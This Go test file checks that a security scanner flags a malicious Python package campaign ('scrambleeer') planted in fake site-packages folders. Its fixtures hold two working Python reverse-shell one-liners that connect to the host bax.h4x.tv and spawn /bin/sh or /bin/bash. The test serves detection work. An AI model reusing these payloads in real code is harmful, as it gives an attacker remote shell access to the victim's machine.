package scan_test

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	_ "github.com/harshmaur/audr/internal/rules/builtin"
	"github.com/harshmaur/audr/internal/scan"
)

func TestScan_ScrambleeerPackageSourceIsContentGated(t *testing.T) {
	root := t.TempDir()
	packageDir := filepath.Join(root, "venv", "lib", "python3.12", "site-packages", "scrambleeer")
	aliasPackageDir := filepath.Join(root, "venv", "lib", "python3.12", "site-packages", "scrambleeeer")
	if err := os.MkdirAll(packageDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(aliasPackageDir, 0o755); err != nil {
		t.Fatal(err)
	}
	malicious := []byte("import socket, subprocess\ns = socket.socket()\ns.connect(('bax.h4x.tv', 443))\nsubprocess.call(['/bin/sh', '-i'])\n")
	if err := os.WriteFile(filepath.Join(packageDir, "client.py"), malicious, 0o644); err != nil {
		t.Fatal(err)
	}
	aliasMalicious := []byte("import os, pty, socket\ns = socket.socket(); s.connect(('bax.h4x.tv', 6363))\nfor fd in (0, 1, 2): os.dup2(s.fileno(), fd)\npty.spawn('/bin/bash')\n")
	if err := os.WriteFile(filepath.Join(aliasPackageDir, "core.py"), aliasMalicious, 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(aliasPackageDir, "other.py"), aliasMalicious, 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(packageDir, "benign.py"), []byte("def scramble(value): return value[::-1]\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	res, err := scan.Run(context.Background(), scan.Options{Roots: []string{root}})
	if err != nil {
		t.Fatal(err)
	}
	count := 0
	for _, result := range res.Findings {
		if result.RuleID == "scrambleeer-reverse-shell-ioc" {
			count++
		}
	}
	if count != 2 {
		t.Fatalf("scrambleeer campaign findings = %d, want 2; findings=%+v", count, res.Findings)
	}
}
